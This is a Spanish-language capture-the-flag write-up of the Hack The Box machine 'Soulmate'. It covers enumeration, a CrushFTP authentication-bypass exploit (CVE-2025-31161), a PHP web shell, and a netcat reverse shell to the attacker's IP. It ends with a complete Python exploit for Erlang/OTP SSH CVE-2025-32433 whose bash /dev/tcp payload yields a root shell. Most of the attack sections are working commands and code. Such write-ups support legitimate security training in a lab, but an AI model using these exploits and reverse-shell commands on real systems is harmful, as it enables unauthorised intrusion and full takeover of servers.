---
tags:
title: Soulmate - Easy (HTB)
permalink: /Soulmate-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.10.11.86
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 22:09 EDT
Nmap scan report for soulmate.htb (10.10.11.86)
Host is up (0.53s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Soulmate - Find Your Perfect Match
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.05 seconds
```

### Service enumeration

#### Port `80` - HTTP/s

Pagina que se me presenta en el puerto `80`.

![image-center](/assets/images/-DBC21D45-32D4-41CA-8A4E-F7E4599458A3- 1.png)

_Luego de ver el apartado de login me registre_

![image-center](/assets/images/-55A8DB80-EDD7-490F-83DA-1FD62E1DA490- 1.png)

Una vez registrado se ve un apartado de subida de archivos que soporta imagenes, las cuales se ven reflejadas en la foto de portada de mi perfil.

>Intente hacer bypasses de diferentes tipos para subir archivos `PHP` malicioso pero no tuve existo,asi que seguimos con la enumeracion.
##### Gobuster fuzzing

```bash
gobuster vhost -u http://soulmate.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 200 --append-domain
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://soulmate.htb
[+] Method:                    GET
[+] Threads:                   200
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
```

Nos encuentra un subdominio bajo el nombre de `ftp`, asi que lo agregamos al `/etc/hosts`

```bash
echo -e '10.10.11.86\t\ftp.soulmate.htb' | sudo tee -a /etc/hosts
```

Ya una vez hecho esto se me presenta la siguiente pagina web

![[Untitled 24 1.jpg]]

Parece que corre el servicio de `Crush FTP`

>`Crush FTP` es un software propietario que funciona como un servidor de transferencia de archivos multiprotocolo y multiplataforma.

Buscando por vulenrebilidades sobre este servicio encontres varios `CVEs`.

```bash
searchsploit crush   
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Crush FTP 5 - 'APPE' Remote JVM Blue Screen of Death (PoC)                                                                                               | windows/dos/17795.py
CrushFTP 11.3.1 - Authentication Bypass                                                                                                                  | multiple/remote/52295.py
CrushFTP 7.2.0 - Multiple Vulnerabilities                                                                                                                | multiple/webapps/36126.txt
CrushFTP < 11.1.0 - Directory Traversal                                                                                                                  | multiple/remote/52012.py
Tomabo MP4 Converter 3.10.12 < 3.11.12 - '.m3u' File Crush Application (Denial of Service)                                                               | windows_x86/dos/38444.py
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Pero como yo me encuentro sin credenciales, voy a probar ganando acceso al segundo script.

Lo pasamos a nuestro equipo 

```bash
searchsploit -m multiple/remote/52295.py
```

Y examinando de que se trata, descubro que se trata de una vulnerabilidad denominada como `Race Condition` la cual existe en el metodo de autenticacion de AWS4-HMAC en un componente HTTP del servidor FTP

Vemos el panel de ayuda del script 

```bash
exploit.py --help
```

```python3 exploit.py --help                                         
usage: exploit.py [-h] [--target TARGET] [--file FILE] [--port PORT] [--check] [--exploit] [--auto-exploit] [--target-user TARGET_USER] [--new-user NEW_USER] [--password PASSWORD]
                  [--verify-exploit] [--threads THREADS] [--timeout TIMEOUT] [--deep-check] [--only-vulnerable] [--output OUTPUT] [--format {txt,json,csv}] [--verbose] [--quiet]
                  [--log-file LOG_FILE] [--log-level {debug,info,warning,error,critical}] [--proxy PROXY] [--user-agent USER_AGENT] [--random-agent] [--delay DELAY]
                  [--custom-headers CUSTOM_HEADERS]

CVE-2025-31161 Exploit Framework - Advanced CrushFTP WebInterface Vulnerability Scanner and Exploiter

options:
  -h, --help            show this help message and exit

Target Specification:
  --target TARGET       Single target host to scan/exploit
  --file FILE           File containing list of targets (one per line)
  --port PORT           Target port (default: 443)

Actions:
  --check               Check targets for vulnerability
  --exploit             Exploit vulnerable targets
  --auto-exploit        Automatically exploit targets found to be vulnerable during check

Exploitation Options:
  --target-user TARGET_USER
                        Target user for exploitation (default: crushadmin)
  --new-user NEW_USER   Username for the new admin account to create
  --password PASSWORD   Password for the new admin account
  --verify-exploit      Verify successful exploitation (default: True)

Scan Options:
  --threads THREADS     Number of concurrent threads (default: 10)
  --timeout TIMEOUT     Connection timeout in seconds (default: 10)
  --deep-check          Perform deeper vulnerability checks
  --only-vulnerable     Only exploit targets that were found vulnerable

Output Options:
  --output OUTPUT       Output file for results
  --format {txt,json,csv}
                        Output format (default: txt)
  --verbose, -v         Enable verbose output
  --quiet, -q           Suppress all output except errors
  --log-file LOG_FILE   Log file to write to
  --log-level {debug,info,warning,error,critical}
                        Log level (default: info)

Advanced Options:
  --proxy PROXY         Proxy to use for requests (e.g., http://127.0.0.1:8080)
  --user-agent USER_AGENT
                        Custom User-Agent string
  --random-agent        Use a random User-Agent for each request
  --delay DELAY         Delay between requests in seconds
  --custom-headers CUSTOM_HEADERS
                        Custom headers as JSON string

Examples:
  # Check a single target for vulnerability
  python cve_2025_31161.py --target example.com --check

  # Exploit a vulnerable target
  python cve_2025_31161.py --target example.com --exploit --new-user hacker --password P@ssw0rd
```

Ajustamos los parametros necesarios en base a nuestra situacion y lo ejecutamos.

```bash
python3 exploit.py --target ftp.soulmate.htb --port 80 --exploit --new-user admin --password P@ssw0rd
```

Una vez ejecutado nos crea el usuario `admin`con privilegios de administrador de la pagina con la contraseña `P@ssw0rd`. Asi que voy directo a la pagina a loguearme.

![-F50630E1-1481-49E1-AC90-3C4DB9E68238-](images/-F50630E1-1481-49E1-AC90-3C4DB9E68238-.png)

Una vez dentro de la pagina, me dirijo a la pestaña `admin` y luego a `User Manager`.

![-F24F3DD8-009E-4CF7-8FB7-8301E3B4F604-](images/-F24F3DD8-009E-4CF7-8FB7-8301E3B4F604-.png)

Una vez estando aca veo algunos usuarios y una seccion en la cual puedo regenerar una nueva contraseña para cada uno, Ademas, Veo que al usuario `ben` el cual tiene la capacidad (ya que como somos admins podemos ver la capacidad de cada usuario ) de ver en la carpeta `webProd` la cual es la ruta de la pagina main (`soulmate.htb`)y dentro de las demas carpetas. Voy a regenerar una nueva para el usuario `ben` y probar si puedo loguearme como el.

![Untitled-iL1XyLau](images/Untitled-iL1XyLau.jpg)

Si le damos a `Generate Random Password` y luego aplicamos los cambios, podemos desloguearnos y loguearno como ben.

Nos deslogueamos y nos autenticamos como dicho user con las credenciales: `ben:NxR7wk`

![Untitled-CidkzaoE](images/Untitled-CidkzaoE.jpg)

Veo que `ben` en el inicio de la pagina tiene las carpetas de la pagina que se monto, Y si entramos en cualquier de ellas, podemos cargar archivos.

![Untitled-x3XiycIO](images/Untitled-x3XiycIO.jpg)

Voy a cargar un `php` el cual pueda usar para poder tener una posible ejecucion remota de comando `RCE`.

![Untitled-jJCoQRCI](images/Untitled-jJCoQRCI.jpg)

Como sabemos que los archivos que cargue van a la pagina `main`, debo ir a ella y a la ruta de la carpeta donde cargue el archivo `php`.

Con  `curl` voy a probar si tenemos ejecucion.

```bash
curl -s -X GET http://soulmate.htb/cmd.php?cmd=whoami
www-data
```

Efectivamente tengo ejecucion remota de comandos, solo me queda enviarme una `reverse shell` a mi maquina.

###### Preparo el listener con `nc`.

```bash
nc -nlvp 4444
```

Y con curl la envio o desde la misma web.

```bash
curl -s -X GET 'http://soulmate.htb/cmd.php?cmd=busybox%20nc%2010.10.16.2%204444%20-e%20%2Fbin%2Fbash'
```

###### Conexion
```bash
nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.86] 35262
whoami
www-data
```

Una vez dentro del sistema como el user `www-data` hacemos un tratamiento de la `tty` para que no muera rapidamente.

```bash
script /dev/null -c bash
```

`Ctrl+z`

```bash
stty raw -echo; fg
```

`reset xterm`

Y exportamos las variables de entorno `xterm` y `bash`.

```bash
export TERM=xterm
export SHELL=bash
```

## Pivoting al user `ben`

```bash
ps faux | grep root
```
Veo un proceso corriendo como `root` el cual no es comun de encontrar

```bash
root        1070  0.1  1.6 2251140 67480 ?       Ssl  04:56   0:02 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

Parece que hace correr el servicio de `erlang` 
>EPMD (Erlang Port Mapper Daemon) es un servicio independiente que actúa como un servidor de nombres para los nodos de Erlang, permitiendo la comunicación y formación de clusters en un sistema distribuido
>
Tambien vi `root` ejecuta un script con el nombre de `start.escript`. Podemos comprobar que erlang esta corriendo con el siguiente comando.

```bash
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33715         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45383         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1138/nginx: worker  
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::4369                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1138/nginx: worker  
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```

Vemos que `erlang` corre por el puerto `4369`por defecto. Esto se puede verificar buscando en internet.

Comprobando el script mencionado anteriormente.

{% raw %}
```bash
cat start.escript 
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```
{% endraw %}

Vemos las credenciales `ben` con su respectiva password : `HouseH0ldings998`, asi que voy a migrar a ese usuario.

```bash
www-data@soulmate:~/soulmate.htb/data$ su ben 
Password: 
ben@soulmate:/var/www/soulmate.htb/data$ whoami
ben
```
## Post-Explotacion / Privilege escalation

Chequeando con la version de `erlang` , veo que corre con la version `12.2.1`.

```bash
/usr/lib/erlang/bin/erl -version
Erlang (SMP,ASYNC_THREADS) (BEAM) emulator version 12.2.1
```

Buscando por algun tipo de vulnerabilidad encuentro este [enlace](https://medium.com/@RosanaFS/erlang-otp-ssh-cve-2025-32433-tryhackme-e410df5f1b53). La cual se trata de una vulnerabilidad en el servicio `# Erlang/OTP SSH`, la cual permite una ejecucion remota de comandos (`RCE`).

#### Breve resumen de la vulnerabilidad
>`Causa`: El error se origina en el manejo inadecuado de los mensajes del protocolo SSH en la fase previa a la autenticación. El servidor procesa incorrectamente ciertos mensajes, como los SSH_MSG_CHANNEL_REQUEST, antes de que el usuario se haya autenticado correctamente.

>`Impacto`: Un atacante con acceso a la red puede enviar paquetes especialmente diseñados para ejecutar comandos arbitrarios en el servidor SSH vulnerable. Si el demonio SSH se ejecuta con privilegios elevados (por ejemplo, como root), la explotación exitosa puede otorgar al atacante el control total del sistema.
>

Para la exlotacion de este `CVE` realice mi propia version del script original para obtener la ejecucion de comandos.

### Script en Python

```python

```#!/usr/bin/env python3
# CVE-2025-32433 Exploit - zs1n version (fix de pad)
import signal
import argparse
import socket
import struct
import time
import sys

def def_handler(sig, frame):
    print("\n\n[!]Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

def string_payload(s):
    s_bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes

def build_channel_open(channel_id=0):
    return (
        b"\x5a"  # SSH_MSG_CHANNEL_OPEN
        + string_payload("session")
        + struct.pack(">I", channel_id)
        + struct.pack(">I", 0x10000)
        + struct.pack(">I", 0x10000)
    )

def build_channel_request(cmd):
    return (
        b"\x62"                  # SSH_MSG_CHANNEL_REQUEST
        + struct.pack(">I", 0)   # recipient channel
        + string_payload("exec")
        + b"\x01"                # want-reply = true
        + string_payload(cmd)
    )

def build_kexinit():
    cookie = b"\x00" * 16
    def name_list(lst):
        return string_payload(",".join(lst))
    return (
        b"\x14" + cookie +  # SSH_MSG_KEXINIT
        name_list(["curve25519-sha256"]) +
        name_list(["rsa-sha2-256"]) +
        name_list(["aes128-ctr"]) * 2 +
        name_list(["hmac-sha1"]) * 2 +
        name_list(["none"]) * 2 +
        name_list([]) * 2 +
        b"\x00" + struct.pack(">I", 0)
    )

def pad(payload, block=8):
    # Calcula el padding como en SSH: packet_length (4) + padding_length (1) + payload + padding
    pad_len = block - ((len(payload) + 5) % block)
    if pad_len < 4:
        pad_len += block
    packet_length = len(payload) + 1 + pad_len  # 1 byte for padding_length
    return struct.pack(">I", packet_length) + bytes([pad_len]) + payload + bytes([0] * pad_len)

# === Exploit flow ===
def main():
    print("="*50)
    print("CVE-2025-32433 Exploit - zs1n version (fix)")
    print("="*50)
    print("Exploit for CVE-2025-32433 - Erlang/OTP SSH Remote Command Execution Vulnerability")
    if len(sys.argv) < 2:
        print("Usage: python3 CVE-2025-32433.py --target <Target IP> --rport <Target SSH Port> --lhost <Local IP> --lport <Local Port>")
        sys.exit(0)
    parser = argparse.ArgumentParser(description="Erlang/OTP SSH Remote Command Execution Exploit")
    parser.add_argument("--target", help="Target IP")
    parser.add_argument("--rport", "--remote port", type=int, default=22, help="Target SSH port (default: 22)")
    parser.add_argument("--lport", "--local port for listener", type=int, default=4444, help="Local listener port (default: 4444)")
    parser.add_argument("--lhost", "--local host for listener")
    args = parser.parse_args()

    command = f'os:cmd("bash -c \'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1\'").'

    with socket.create_connection((args.target, args.rport)) as s:
        s.sendall(b"SSH-2.0-OpenSSH_7.4\r\n")
        try:
            s.recv(1024)
        except Exception:
            pass
        time.sleep(1)

        print(f"Sending KEXINIT SSH_MSG...")
        s.sendall(pad(build_kexinit()))
        time.sleep(1)

        print(f"Sending CHANNEL_OPEN SSH_MSG...")
        s.sendall(pad(build_channel_open()))
        time.sleep(1)

        print(f"Sending CHANNEL_REQUEST SSH_MSG with payload...\n\n")
        s.sendall(pad(build_channel_request(command)))
        print(f"[+]Shell payload sent to: {args.lhost}:{args.lport}")
        print(f"[+]If the target can reach your listener, you should get a reverse shell.")
if __name__ == "__main__":
    main()
```

Lo ejecutamos apuntando al puerto `SSH` donde se ejecuta la explotacion.

Preparmos nuestro listener `nc`

```bash
nc -nvlp 4444
```
Ejecutamos el script

```bash
python3 erlang.py --target 127.0.0.1 --rport 2222 --lhost 10.10.16.2 --lport 4444
==================================================
CVE-2025-32433 Exploit - zs1n version (fix)
==================================================
Exploit for CVE-2025-32433 - Erlang/OTP SSH Remote Command Execution Vulnerability
Sending KEXINIT SSH_MSG...
Sending CHANNEL_OPEN SSH_MSG...
Sending CHANNEL_REQUEST SSH_MSG with payload...


[+]Shell payload sent to: 10.10.16.2:4444
[+]If the target can reach your listener, you should get a reverse shell.
```

Y con exito recibo mi shell como `root`
```bash
sudo nc -nlvp 4444
[sudo] password for zsln: 
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.86] 47328
bash: cannot set terminal process group (3026): Inappropriate ioctl for device
bash: no job control in this shell
root@soulmate:/# whoami
whoami
root 
```

`~Happy hacking.`




